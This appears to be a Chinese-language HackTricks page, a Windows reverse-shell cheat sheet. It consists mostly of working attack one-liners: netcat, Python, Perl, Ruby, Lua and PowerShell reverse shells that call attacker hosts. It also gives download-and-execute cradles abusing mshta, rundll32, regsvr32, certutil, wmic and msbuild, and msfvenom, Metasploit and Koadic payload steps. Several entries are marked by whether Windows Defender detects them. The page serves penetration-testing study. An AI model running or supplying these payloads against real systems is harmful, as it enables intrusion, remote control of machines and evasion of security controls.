# Shells - Windows

<details>

<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到对您最重要的漏洞，以便更快修复它们。Intruder追踪您的攻击面，进行主动威胁扫描，在您的整个技术栈中找到问题，从API到Web应用程序和云系统。[**今天就免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

页面 [lolbas-project.github.io](https://lolbas-project.github.io/) 对于Windows系统就像 [https://gtfobins.github.io/](https://gtfobins.github.io/) 对于Linux一样。\
显然，**Windows中没有SUID文件或sudo权限**，但了解一些**二进制文件**如何被（滥）用来执行一些意想不到的动作，比如**执行任意代码**，是非常有用的。

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** 是一个Netcat克隆版，设计上便于移植并提供强加密功能。它可以在类Unix操作系统和Microsoft Win32上运行。sbd具备AES-CBC-128 + HMAC-SHA1加密（由Christophe Devine开发）、程序执行（-e选项）、选择源端口、带延迟的持续重连以及一些其他实用功能。sbd仅支持TCP/IP通信。sbd.exe（Kali linux发行版的一部分：/usr/share/windows-resources/sbd/sbd.exe）可以上传到Windows系统作为Netcat的替代品。
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

攻击者 (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
受害者
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
进行网络调用的进程：**powershell.exe**\
磁盘上写入的有效载荷：**否**（_至少我使用procmon找不到！_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
进程执行网络调用：**svchost.exe**\
载荷写入磁盘：**WebDAV 客户端本地缓存**

**一行代码：**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**在本文档末尾了解更多关于不同Powershell Shells的信息**

## Mshta
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
进行网络调用的进程：**mshta.exe**\
在磁盘上写入的有效载荷：**IE 本地缓存**
```bash
mshta http://webserver/payload.hta
```
进行网络调用的进程：**mshta.exe**\
在磁盘上写入的有效载荷：**IE 本地缓存**
```bash
mshta \\webdavserver\folder\payload.hta
```
进程执行网络调用：**svchost.exe**\
载荷写入磁盘：**WebDAV 客户端本地缓存**

#### **hta-psh 反向 shell 示例（使用 hta 下载并执行 PS 后门）**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**您可以非常轻松地下载并执行使用stager hta的Koadic僵尸程序**

#### hta 示例
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
**摘自** [**此处**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)

#### **mshta - sct**
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
**摘自** [**此处**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)

#### **Mshta - Metasploit**
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**被防御者检测到**

## **Rundll32**

[**Dll hello world 示例**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
进程执行网络调用：**svchost.exe**\
载荷写入磁盘：**WebDAV 客户端本地缓存**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
进程执行网络调用：**rundll32.exe**\
载荷写入磁盘：**IE 本地缓存**

**被防御者检测到**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
**摘自** [**此处**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)

#### **Rundll32 - Metasploit**
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
进程执行网络调用：**regsvr32.exe**\
载荷写入磁盘：**IE 本地缓存**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
进程执行网络调用：**svchost.exe**\
载荷写入磁盘：**WebDAV 客户端本地缓存**

**被 defender 检测到**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
**摘自** [**此处**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)

#### **Regsvr32 - Metasploit**
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**您可以非常容易地下载并执行使用stager regsvr的Koadic僵尸程序**

## Certutil

下载一个B64dll，对其解码并执行。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
下载一个B64exe，解码并执行它。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**被防御者检测到**

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便您能更快修复它们。Intruder 跟踪您的攻击面，运行主动威胁扫描，在您的整个技术栈中找到问题，从API到Web应用程序和云系统。今天就[**免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**被防御者检测到**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
进程执行网络调用：**svchost.exe**\
载荷写入磁盘：**WebDAV 客户端本地缓存**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**被防御者检测到**

## **MSIExec**

攻击者
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
受害者：
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**检测到**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
进程执行网络调用：**wmic.exe**\
负载写入磁盘：**IE 本地缓存**

示例 xsl 文件：
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
提取自[此处](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**未被检测**

**您可以非常容易地下载并执行一个使用stager wmic的Koadic僵尸程序**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
执行网络调用的进程：**svchost.exe**\
磁盘上写入的有效载荷：**WebDAV 客户端本地缓存**

您可以使用此技术绕过应用程序白名单和 Powershell.exe 限制。因为您将被提示使用 PS shell。\
只需下载并执行它：[https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**未被检测到**

## **CSC**

在受害者机器上编译C#代码。
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
您可以从这里下载一个基础的C#反向Shell：[https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**未被检测到**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
执行网络调用的进程：**svchost.exe**\
在磁盘上写入的有效载荷：**WebDAV客户端本地缓存**

**我还没有尝试过**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
执行网络调用的进程：**svchost.exe**\
磁盘上写入的有效载荷：**WebDAV 客户端本地缓存**

**我还没有尝试过**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell Shells

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

在 **Shells** 文件夹中，有很多不同的 shell。要下载并执行 Invoke-_PowerShellTcp.ps1_，复制脚本并在文件末尾追加：
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
在Web服务器上开始提供脚本，并在受害者端执行它：
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender 目前（截至 2019 年 3 月 4 日）尚未将其检测为恶意代码。

**待办事项：检查其他 nishang shells**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

下载，启动一个 web 服务器，开始监听，然后在受害者端执行：
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender 目前尚未将其检测为恶意代码（截至 2019年3月4日）。

**powercat 提供的其他选项：**

绑定 shell，反向 shell（TCP、UDP、DNS），端口重定向，上传/下载，生成有效载荷，服务文件...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

创建一个powershell启动器，将其保存在文件中，下载并执行。
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**检测到恶意代码**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

使用unicorn创建一个powershell版本的metasploit后门
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
启动 msfconsole 并使用创建的资源：
```
msfconsole -r unicorn.rc
```
启动一个提供 _powershell\_attack.txt_ 文件的网页服务器，并在受害者系统中执行：
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**检测为恶意代码**

## 更多

[PS>Attack](https://github.com/jaredhaight/PSAttack) 预加载了一些攻击性PS模块的PS控制台（加密）\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)\
[WinPWN](https://github.com/SecureThisShit/WinPwn) 预加载了一些攻击性PS模块和代理检测的PS控制台（IEX）

## 参考文献

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到对您最重要的漏洞，以便您能更快修复它们。Intruder 跟踪您的攻击面，运行主动威胁扫描，在您的整个技术栈中找到问题，从API到Web应用程序和云系统。今天就[**免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>
